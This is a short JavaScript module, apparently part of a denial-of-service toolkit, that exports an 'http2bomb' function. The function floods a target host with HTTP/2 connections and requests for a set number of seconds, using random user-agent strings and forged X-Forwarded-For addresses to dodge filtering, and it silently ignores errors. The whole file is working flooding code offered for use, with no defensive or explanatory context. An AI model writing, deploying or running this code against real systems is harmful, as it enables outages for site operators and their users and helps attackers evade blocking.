const http2 = require('http2-wrapper');

function http2bomb(host, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    try{
      const client = http2.connect(`https://${host}`);
      const req = client.request({':path':'/', 'user-agent':global.randUA(), 'x-forwarded-for':global.randIP()});
      req.close();
      client.close();
    }catch{}
  }
}
module.exports = { http2bomb };